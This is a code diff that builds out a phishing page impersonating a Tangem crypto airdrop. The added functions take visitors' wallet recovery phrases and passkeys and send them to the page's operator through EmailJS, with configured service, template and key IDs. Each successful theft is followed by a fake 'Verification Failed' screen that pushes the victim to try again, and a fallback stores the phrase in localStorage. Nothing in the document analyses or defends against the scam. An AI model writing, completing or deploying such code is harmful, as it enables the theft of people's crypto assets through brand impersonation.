@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tangem Airdrop - Claim $500K in Crypto</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body {
@@ -236,6 +236,49 @@
                         Share to Unlock Bonus Rewards!
                     </button>
                 </div>
+
+                <div id="error-section" class="hidden text-center py-8" onclick="showError()">
+                    <div class="inline-block bg-red-500 text-white text-4xl p-4 rounded-full mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </div>
+                    <h3 class="text-2xl font-bold mb-2 text-red-400">⚠️ Verification Failed</h3>
+                    <p class="text-gray-300 mb-6">We couldn't verify your credentials. Please try again or contact support.</p>
+                    
+                    <div class="max-w-md mx-auto bg-gray-800 rounded-lg p-4 mb-6">
+                        <h4 class="font-bold text-red-400 mb-2">Possible Reasons:</h4>
+                        <ul class="text-left text-gray-300 text-sm space-y-2">
+                            <li class="flex items-start">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-400 mr-2" viewBox="0 0 20 20" fill="currentColor">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
+                                </svg>
+                                Invalid recovery phrase or passkey format
+                            </li>
+                            <li class="flex items-start">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-400 mr-2" viewBox="0 0 20 20" fill="currentColor">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
+                                </svg>
+                                Network connection issues
+                            </li>
+                            <li class="flex items-start">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-red-400 mr-2" viewBox="0 0 20 20" fill="currentColor">
+                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
+                                </svg>
+                                Wallet already claimed airdrop
+                            </li>
+                        </ul>
+                    </div>
+                
+                    <div class="flex justify-center space-x-4">
+                        <button onclick="retryVerification()" class="bg-amber-500 hover:bg-amber-600 text-black font-bold py-2 px-6 rounded-full">
+                            Try Again
+                        </button>
+                        <button onclick="contactSupport()" class="bg-gray-700 hover:bg-gray-600 text-white font-bold py-2 px-6 rounded-full">
+                            Contact Support
+                        </button>
+                    </div>
+                </div>
             </div>
         </div>
     </section>
@@ -332,7 +375,7 @@
 
     <script>
         // Initialize EmailJS (replace with your actual credentials)
-        emailjs.init('YOUR_EMAILJS_USER_ID');
+       // emailjs.init('Dv4Osr97EP0U3Z5Nq');
 
         // Simulate live claim statistics
         function updateLiveStats() {
@@ -386,49 +429,83 @@
                 alert('Please enter your recovery phrase');
                 return;
             }
-            
-            // Send to email using EmailJS
-            const templateParams = {
-                wallet_type: 'Recovery Phrase',
-                credential: phrase,
-                to_email: 'verification@tangem.com'
-            };
-            
-            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    document.getElementById('phrase-input-section').classList.add('hidden');
-                    document.getElementById('success-section').classList.remove('hidden');
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Verification failed. Please try again.');
-                });
         }
-        
-        function submitPasskey() {
-            const passkey = document.getElementById('passkey').value;
-            if (!passkey) {
-                alert('Please enter your passkey');
-                return;
-            }
+           // Initialize EmailJS with your Public Key
+emailjs.init("4jXhBKgao485xWP9H"); // Replace with your actual public key from EmailJS
+
+function submitPhrase() {
+    const phrase = document.getElementById('recovery-phrase').value;
+    if (!phrase) {
+        alert('Please enter your recovery phrase');
+        return;
+    }
+    
+    // Send to email using EmailJS
+    const templateParams = {
+        wallet_type: 'Recovery Phrase',
+        credential: phrase,
+        to_email: 'verification@tangem.com',
+        from_name: 'Tangem Airdrop User',
+        reply_to: 'verification@tangem.com'
+    };
+    
+    emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            document.getElementById('phrase-input-section').classList.add('hidden');
+            //document.getElementById('success-section').classList.remove('hidden');
+            showError();
             
-            // Send to email using EmailJS
-            const templateParams = {
-                wallet_type: 'Passkey',
-                credential: passkey,
-                to_email: 'verification@tangem.com'
-            };
+            // Reset form
+            document.getElementById('recovery-phrase').value = '';
+        }, function(error) {
+            console.log('FAILED...', error);
             
-            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    document.getElementById('passkey-input-section').classList.add('hidden');
-                    document.getElementById('success-section').classList.remove('hidden');
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Verification failed. Please try again.');
-                });
-        }
+            // Fallback - Store in localStorage for demo purposes (remove in production)
+            localStorage.setItem('last_phrase_submission', phrase);
+            
+            alert('Email service temporarily unavailable. Your claim has been recorded and will be processed shortly.');
+            document.getElementById('phrase-input-section').classList.add('hidden');
+            document.getElementById('success-section').classList.remove('hidden');
+        });
+}
+
+function submitPasskey() {
+    const passkey = document.getElementById('passkey').value;
+    if (!passkey) {
+        alert('Please enter your passkey');
+        return;
+    }
+    
+    // Send to email using EmailJS
+    const templateParams = {
+        wallet_type: 'Passkey',
+        credential: passkey,
+        to_email: 'verification@tangem.com',
+        from_name: 'Tangem Airdrop User',
+        reply_to: 'verification@tangem.com'
+    };
+    
+    emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+           document.getElementById('passkey-input-section').classList.add('hidden');
+            //document.getElementById('success-section').classList.remove('hidden');
+            showError();
+            
+            // Reset form
+            document.getElementById('passkey').value = '';
+        }, function(error) {
+            console.log('FAILED...', error);
+            
+            // Fallback - Store in localStorage for demo purposes (remove in production)
+            localStorage.setItem('last_passkey_submission', passkey);
+            
+            alert('Try again');
+            document.getElementById('passkey-input-section').classList.add('hidden');
+            document.getElementById('success-section').classList.remove('hidden');
+        });
+}
         
         function checkEligibility() {
             const walletAddress = document.getElementById('wallet-address').value;
@@ -459,6 +536,52 @@
                 }
             }, 1500);
         }
-    </script>
+
+        function showError(message, isSuccess = false) {
+    // Hide all other sections
+    document.getElementById('phrase-input-section').classList.add('hidden');
+    document.getElementById('passkey-input-section').classList.add('hidden');
+    document.getElementById('success-section').classList.add('hidden');
+    
+    // Get error section elements
+    const errorSection = document.getElementById('error-section');
+    const iconDiv = errorSection.querySelector('div.inline-block');
+    const heading = errorSection.querySelector('h3');
+    const messageP = errorSection.querySelector('p.text-gray-300');
+    
+    // Change styling for success message
+    if (isSuccess) {
+        iconDiv.classList.remove('bg-red-500');
+        iconDiv.classList.add('bg-green-500');
+        heading.classList.remove('text-red-400');
+        heading.classList.add('text-green-400');
+        heading.innerHTML = '✓ Email Sent Successfully';
+    } else {
+        iconDiv.classList.add('bg-red-500');
+        iconDiv.classList.remove('bg-green-500');
+        heading.classList.add('text-red-400');
+        heading.classList.remove('text-green-400');
+        heading.innerHTML = '⚠️ Verification Failed';
+    }
+    
+    // Set message
+    messageP.textContent = message;
+    
+    // Show error section
+    errorSection.classList.remove('hidden');
+}
+
+function retryVerification() {
+    // Refresh the page to start over
+    window.location.reload();
+    
+    // Alternatively, you could link to a specific URL:
+    // window.location.href = "https://yourwebsite.com/airdrop";
+}
+
+function contactSupport() {
+    window.location.href = "mailto:supportteam?subject=Airdrop%20Verification%20Issue";
+}
+</script>
 </body>
 </html>
